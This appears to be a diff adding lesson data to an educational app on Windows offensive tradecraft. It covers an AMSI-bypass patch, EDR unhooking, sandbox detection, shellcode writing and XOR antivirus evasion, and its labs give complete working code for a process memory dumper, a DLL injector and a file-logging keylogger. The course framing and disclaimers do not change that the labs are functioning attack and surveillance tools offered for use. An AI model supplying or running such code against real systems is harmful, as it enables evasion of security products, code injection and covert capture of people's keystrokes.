+            code: `// CONCEPT ONLY - for understanding
+// AmsiScanBuffer normally returns a scan result
+
+// The patch makes it return immediately with "clean"
+// By writing these bytes at the function start:
+
+// x64 patch bytes:
+// B8 57 00 07 80    mov eax, 0x80070057 (invalid param)
+// C3                ret
+
+// In code, you would:
+// 1. Get address of AmsiScanBuffer
+// 2. Change memory protection to RWX
+// 3. Write the patch bytes
+// 4. Restore protection
+
+// This is detected by most EDRs now!
+// They monitor for writes to amsi.dll`,
+            language: "c"
+          },
+          warning: `AMSI bypass is heavily monitored. Many bypass techniques are now signatures themselves.`
+        },
+        {
+          title: "API Unhooking",
+          content: `Security products "hook" functions by replacing their first bytes with a jump to monitoring code. Unhooking restores the original bytes.
+
+**The process:**
+1. Read a fresh copy of ntdll.dll from disk
+2. Find the hooked function
+3. Copy the original bytes back`,
+          example: {
+            title: "Unhooking Concept",
+            code: `#include <windows.h>
+#include <stdio.h>
+
+// Simplified unhooking concept
+void UnhookFunction(LPCSTR funcName) {
+    // 1. Get the hooked function address
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    FARPROC func = GetProcAddress(ntdll, funcName);
+    
+    // 2. Read fresh ntdll from disk
+    HANDLE hFile = CreateFileA(
+        "C:\\\\Windows\\\\System32\\\\ntdll.dll",
+        GENERIC_READ, FILE_SHARE_READ,
+        NULL, OPEN_EXISTING, 0, NULL
+    );
+    
+    // 3. Map it and find the original bytes
+    // (This is simplified - real code needs to 
+    // parse PE headers to find the function)
+    
+    // 4. Copy original bytes over the hook
+    // VirtualProtect + memcpy + VirtualProtect
+    
+    printf("Unhooking %s...\\n", funcName);
+    CloseHandle(hFile);
+}`,
+            language: "c"
+          },
+          tip: `Some EDRs now detect unhooking by monitoring reads of ntdll.dll from disk or by re-hooking functions.`
+        },
+        {
+          title: "Sleep Obfuscation",
+          content: `When malware sleeps (waits), its code is still in memory and can be scanned. Sleep obfuscation encrypts the code during sleep.
+
+**Techniques:**
+• Ekko - Uses timers to encrypt/decrypt
+• Foliage - Similar with different implementation
+• The code encrypts itself before sleeping, decrypts when waking`,
+          concepts: [
+            { label: "Sleep", explanation: "When code is waiting, not executing" },
+            { label: "Memory Scanning", explanation: "EDRs scan process memory for malware signatures" },
+            { label: "Encryption", explanation: "Making the code unreadable while sleeping" }
+          ]
+        },
+        {
+          title: "VM & Sandbox Detection",
+          content: `Malware often checks if it's running in a VM or sandbox before executing. If detected, it exits cleanly.
+
+**Common checks:**
+• VM processes (vmtoolsd.exe, vboxservice.exe)
+• VM registry keys
+• Disk size (sandboxes often have small disks)
+• Number of files (real systems have more files)
+• User interaction (sandboxes don't move the mouse)`,
+          example: {
+            title: "Simple VM Detection",
+            code: `#include <windows.h>
+#include <stdio.h>
+
+BOOL IsVM() {
+    HKEY hKey;
+    
+    // Check VMware
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
+        "SOFTWARE\\\\VMware, Inc.\\\\VMware Tools",
+        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        RegCloseKey(hKey);
+        return TRUE;
+    }
+    
+    // Check VirtualBox
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
+        "SOFTWARE\\\\Oracle\\\\VirtualBox Guest Additions",
+        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        RegCloseKey(hKey);
+        return TRUE;
+    }
+    
+    return FALSE;
+}
+
+int main() {
+    if (IsVM()) {
+        printf("VM detected - exiting\\n");
+        return 0;
+    }
+    printf("Running on real hardware\\n");
+    return 0;
+}`,
+            language: "c"
+          }
+        }
+      ]
+    },
+    shellcode: {
+      title: "Shellcode Development",
+      description: "Position-independent code and payload development",
+      sections: [
+        {
+          type: "intro",
+          content: `Shellcode is raw, position-independent machine code. It's called "shellcode" because historically it was used to spawn a shell. Today it refers to any injectable code.`
+        },
+        {
+          title: "What Makes Shellcode Special?",
+          content: `Shellcode must work wherever it's loaded in memory. Normal programs rely on fixed addresses - shellcode can't do that.
+
+**Requirements:**
+• Position Independent (no hardcoded addresses)
+• Self-contained (no external dependencies)
+• Usually small and efficient
+• No null bytes (for string-based exploits)`,
+          concepts: [
+            { label: "PIC", explanation: "Position Independent Code - works at any address" },
+            { label: "RIP-relative", explanation: "x64 addressing relative to current instruction" },
+            { label: "Null-free", explanation: "No 0x00 bytes which could break string handling" }
+          ],
+          example: {
+            title: "Simple Shellcode - Return",
+            description: "The simplest shellcode just returns:",
+            code: `; x64 shellcode that just returns
+; Assembled bytes: C3
+
+ret     ; Just return to caller
+
+; To test:
+unsigned char code[] = { 0xC3 };
+
+LPVOID mem = VirtualAlloc(NULL, sizeof(code),
+    MEM_COMMIT | MEM_RESERVE, 
+    PAGE_EXECUTE_READWRITE);
+    
+memcpy(mem, code, sizeof(code));
+((void(*)())mem)();  // Execute it`,
+            language: "asm"
+          }
+        },
+        {
+          title: "Finding Functions Without Imports",
+          content: `Normal code uses the Import Address Table. Shellcode must find functions at runtime.
+
+**The technique (PEB walking):**
+1. Get PEB from the TEB
+2. Find the loader data
+3. Walk the module list to find kernel32.dll
+4. Parse its export table to find functions`,
+          example: {
+            title: "Finding Kernel32 (Pseudocode)",
+            code: `; Get PEB from TEB
+mov rax, gs:[0x60]    ; PEB pointer
+
+; Get Ldr (loader data)
+mov rax, [rax+0x18]   ; PEB->Ldr
+
+; Get first module in list
+mov rax, [rax+0x20]   ; InMemoryOrderModuleList
+
+; Walk the list to find kernel32.dll
+; (Check module name, keep walking until found)
+
+; Once found, parse the PE export table
+; to find GetProcAddress
+; Then use GetProcAddress to find everything else!`,
+            language: "asm"
+          },
+          tip: `Once you have GetProcAddress, you can find any function. It's the key to making shellcode work.`
+        },
+        {
+          title: "Writing Shellcode in C",
+          content: `You don't have to write shellcode in assembly! Write in C with special compiler settings.
+
+**The approach:**
+1. Write C code with no external dependencies
+2. Compile as position-independent
+3. Extract the .text section
+4. That's your shellcode!`,
+          concepts: [
+            { label: "-fPIC", explanation: "GCC flag for position-independent code" },
+            { label: "No CRT", explanation: "Don't link C runtime library" },
+            { label: "Intrinsics", explanation: "Compiler-built-in functions that don't need imports" }
+          ],
+          example: {
+            title: "Shellcode-friendly C",
+            code: `// Compile with special flags:
+// No standard library
+// Position independent
+// No stack protector
+
+// All functions must be resolved at runtime
+typedef void* (WINAPI *pLoadLibrary)(char*);
+typedef void* (WINAPI *pGetProcAddress)(void*, char*);
+
+void shellcode_main() {
+    // Get kernel32 base via PEB walking
+    void* kernel32 = find_kernel32();
+    
+    // Find GetProcAddress
+    pGetProcAddress gpa = find_export(
+        kernel32, "GetProcAddress");
+    
+    // Now use gpa to find other functions
+    pLoadLibrary ll = gpa(kernel32, "LoadLibraryA");
+    
+    // Load user32 and show a message box
+    void* user32 = ll("user32.dll");
+    // ... continue
+}`,
+            language: "c"
+          }
+        },
+        {
+          title: "Encoding and Encryption",
+          content: `Raw shellcode contains signatures that AV can detect. Encoding or encrypting it helps evade detection.
+
+**Common techniques:**
+• XOR encoding (simple, fast)
+• AES encryption (stronger)
+• Custom encoders (unique to you)
+
+**The stub:**
+Your shellcode needs a decoder stub that runs first to decrypt the payload.`,
+          example: {
+            title: "XOR Encoder",
+            code: `#include <stdio.h>
+
+void xor_encode(unsigned char* data, int len, 
+                unsigned char key) {
+    for (int i = 0; i < len; i++) {
+        data[i] ^= key;
+    }
+}
+
+int main() {
+    // Original shellcode (just ret)
+    unsigned char shellcode[] = { 0xC3 };
+    unsigned char key = 0x41;
+    
+    printf("Original: ");
+    for (int i = 0; i < sizeof(shellcode); i++)
+        printf("%02X ", shellcode[i]);
+    
+    xor_encode(shellcode, sizeof(shellcode), key);
+    
+    printf("\\nEncoded:  ");
+    for (int i = 0; i < sizeof(shellcode); i++)
+        printf("%02X ", shellcode[i]);
+    
+    // At runtime, XOR again to decode
+    xor_encode(shellcode, sizeof(shellcode), key);
+    
+    printf("\\nDecoded:  ");
+    for (int i = 0; i < sizeof(shellcode); i++)
+        printf("%02X ", shellcode[i]);
+    
+    return 0;
+}`,
+            language: "c"
+          },
+          warning: `Simple XOR is easily detected. Modern AV can decrypt and scan. Use multiple layers of encoding.`
+        }
+      ]
+    },
+    labs: {
+      title: "Practical Labs",
+      description: "Build real security tools step-by-step",
+      sections: [
+        {
+          type: "intro",
+          content: `Time to put everything together! In these labs, you'll build real tools that demonstrate the concepts you've learned. Each lab includes complete working code.`
+        },
+        {
+          title: "Lab 1: Process Memory Dumper",
+          content: `Build a tool that dumps the memory of a running process. This is useful for malware analysis and debugging.
+
+**What you'll learn:**
+• Opening processes with the right permissions
+• Reading process memory
+• Saving data to files`,
+          example: {
+            title: "Process Dumper",
+            code: `#include <windows.h>
+#include <stdio.h>
+
+BOOL DumpProcessMemory(DWORD pid, LPCWSTR outFile) {
+    HANDLE hProcess = OpenProcess(
+        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
+        FALSE, pid
+    );
+    
+    if (!hProcess) {
+        printf("Failed to open process: %lu\\n", 
+            GetLastError());
+        return FALSE;
+    }
+    
+    HANDLE hFile = CreateFileW(outFile,
+        GENERIC_WRITE, 0, NULL,
+        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    
+    if (hFile == INVALID_HANDLE_VALUE) {
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+    
+    SYSTEM_INFO si;
+    GetSystemInfo(&si);
+    
+    MEMORY_BASIC_INFORMATION mbi;
+    LPVOID addr = si.lpMinimumApplicationAddress;
+    
+    while (addr < si.lpMaximumApplicationAddress) {
+        if (VirtualQueryEx(hProcess, addr, &mbi, 
+            sizeof(mbi)) == sizeof(mbi)) {
+            
+            if (mbi.State == MEM_COMMIT && 
+                (mbi.Protect & PAGE_READWRITE)) {
+                
+                BYTE* buffer = malloc(mbi.RegionSize);
+                SIZE_T bytesRead;
+                
+                if (ReadProcessMemory(hProcess, addr,
+                    buffer, mbi.RegionSize, &bytesRead)) {
+                    
+                    DWORD written;
+                    WriteFile(hFile, buffer, 
+                        bytesRead, &written, NULL);
+                }
+                free(buffer);
+            }
+            addr = (LPVOID)((DWORD_PTR)mbi.BaseAddress 
+                + mbi.RegionSize);
+        } else {
+            addr = (LPVOID)((DWORD_PTR)addr + 0x1000);
+        }
+    }
+    
+    CloseHandle(hFile);
+    CloseHandle(hProcess);
+    return TRUE;
+}`,
+            language: "c"
+          }
+        },
+        {
+          title: "Lab 2: DLL Injector",
+          content: `Build a complete DLL injector with error handling. This combines many concepts from the course.
+
+**Features:**
+• Process selection by name or PID
+• DLL path validation
+• Proper cleanup`,
+          example: {
+            title: "Complete DLL Injector",
+            code: `#include <windows.h>
+#include <tlhelp32.h>
+#include <stdio.h>
+
+DWORD FindProcess(const wchar_t* name) {
+    HANDLE snap = CreateToolhelp32Snapshot(
+        TH32CS_SNAPPROCESS, 0);
+    
+    PROCESSENTRY32W pe = { sizeof(pe) };
+    
+    if (Process32FirstW(snap, &pe)) {
+        do {
+            if (_wcsicmp(pe.szExeFile, name) == 0) {
+                CloseHandle(snap);
+                return pe.th32ProcessID;
+            }
+        } while (Process32NextW(snap, &pe));
+    }
+    
+    CloseHandle(snap);
+    return 0;
+}
+
+BOOL Inject(DWORD pid, const char* dllPath) {
+    printf("[*] Opening process %lu...\\n", pid);
+    
+    HANDLE hProc = OpenProcess(
+        PROCESS_CREATE_THREAD | 
+        PROCESS_VM_OPERATION |
+        PROCESS_VM_WRITE,
+        FALSE, pid
+    );
+    
+    if (!hProc) {
+        printf("[!] OpenProcess failed: %lu\\n", 
+            GetLastError());
+        return FALSE;
+    }
+    
+    size_t len = strlen(dllPath) + 1;
+    
+    printf("[*] Allocating memory...\\n");
+    LPVOID mem = VirtualAllocEx(hProc, NULL, len,
+        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    
+    if (!mem) {
+        printf("[!] VirtualAllocEx failed\\n");
+        CloseHandle(hProc);
+        return FALSE;
+    }
+    
+    printf("[*] Writing DLL path...\\n");
+    if (!WriteProcessMemory(hProc, mem, 
+        dllPath, len, NULL)) {
+        printf("[!] WriteProcessMemory failed\\n");
+        VirtualFreeEx(hProc, mem, 0, MEM_RELEASE);
+        CloseHandle(hProc);
+        return FALSE;
+    }
+    
+    printf("[*] Creating remote thread...\\n");
+    HANDLE hThread = CreateRemoteThread(hProc,
+        NULL, 0,
+        (LPTHREAD_START_ROUTINE)LoadLibraryA,
+        mem, 0, NULL);
+    
+    if (hThread) {
+        WaitForSingleObject(hThread, 5000);
+        CloseHandle(hThread);
+        printf("[+] Injection successful!\\n");
+    }
+    
+    VirtualFreeEx(hProc, mem, 0, MEM_RELEASE);
+    CloseHandle(hProc);
+    return hThread != NULL;
+}
+
+int main(int argc, char* argv[]) {
+    printf("=== DLL Injector ===\\n\\n");
+    
+    DWORD pid = FindProcess(L"notepad.exe");
+    if (pid == 0) {
+        printf("Target not found\\n");
+        return 1;
+    }
+    
+    printf("[*] Found target: PID %lu\\n", pid);
+    Inject(pid, "C:\\\\path\\\\to\\\\your.dll");
+    
+    return 0;
+}`,
+            language: "c"
+          },
+          warning: `Only use on systems you own. Injection into other processes may trigger security alerts.`
+        },
+        {
+          title: "Lab 3: Simple Keylogger",
+          content: `Learn how input monitoring works by building a basic keylogger. This demonstrates Windows hooks.
+
+**Concepts:**
+• SetWindowsHookEx for keyboard hooks
+• Message loops
+• Low-level input handling`,
+          tip: `This is for educational purposes. Real keyloggers are illegal without consent!`,
+          example: {
+            title: "Keyboard Hook Example",
+            code: `#include <windows.h>
+#include <stdio.h>
+
+HHOOK hHook;
+FILE* logFile;
+
+LRESULT CALLBACK KeyboardProc(
+    int nCode, WPARAM wParam, LPARAM lParam) {
+    
+    if (nCode >= 0 && wParam == WM_KEYDOWN) {
+        KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lParam;
+        
+        char key = MapVirtualKey(kb->vkCode, 
+            MAPVK_VK_TO_CHAR);
+        
+        if (key >= 32 && key <= 126) {
+            printf("%c", key);
+            if (logFile) {
+                fprintf(logFile, "%c", key);
+                fflush(logFile);
+            }
+        }
+    }
+    
+    return CallNextHookEx(hHook, nCode, wParam, lParam);
+}
+
+int main() {
+    printf("[*] Keyboard monitor started\\n");
+    printf("[*] Press Ctrl+C to stop\\n\\n");
+    
+    logFile = fopen("keys.txt", "a");
+    
+    hHook = SetWindowsHookEx(
+        WH_KEYBOARD_LL,
+        KeyboardProc,
+        GetModuleHandle(NULL),
+        0
+    );
+    
+    if (!hHook) {
+        printf("Hook failed: %lu\\n", GetLastError());
+        return 1;
+    }
+    
+    MSG msg;
+    while (GetMessage(&msg, NULL, 0, 0)) {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+    
+    UnhookWindowsHookEx(hHook);
+    if (logFile) fclose(logFile);
+    
+    return 0;
+}`,
+            language: "c"
+          }
+        }
+      ]
+    }
   };
 
   const currentLesson = lessons[moduleId];
